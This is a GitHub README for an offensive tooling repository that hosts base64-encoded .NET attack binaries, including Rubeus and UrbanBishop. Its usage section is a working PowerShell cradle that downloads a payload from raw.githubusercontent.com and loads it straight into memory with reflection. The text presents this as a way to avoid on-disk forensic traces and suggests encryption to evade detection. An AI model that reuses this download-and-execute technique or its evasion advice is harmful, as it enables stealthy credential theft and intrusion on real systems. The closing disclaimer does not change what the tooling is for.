# LookingSharp
This repository has been created to hold all the .net binaries used for Reflection Assembly loading. For this to work the host has to be able to access githubusercontent.com. The reason for adding the Powershell v1.0 is because syswow64 lets you run 32 bit system executables from 64 bit code. Sysnative lets you run 64 bit system executables from 32 bit code.

# Tools currently available:
- ProcessManager
- Rubeus
- UrbanBishop

# Usage:
```
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
$content = (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/felixguerrero12/LookingSharp/master/txt/ProcessManager.txt')
$ProcessManagerAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
[ProcessManager.Program]::Main("".Split())
```

The above removes steps of downloading the binary and converting it into Assembly. Removes the binary from going on-disk and straight into memory. Operationally its a little bit cleaner on system forensics - If network capture is enabled on the environment the technique can be identified. You can add some sort of encryption to avoid detection.

*Disclaimer: Whatever is done with the tools in this repository are only liable with the offending operator(s).*
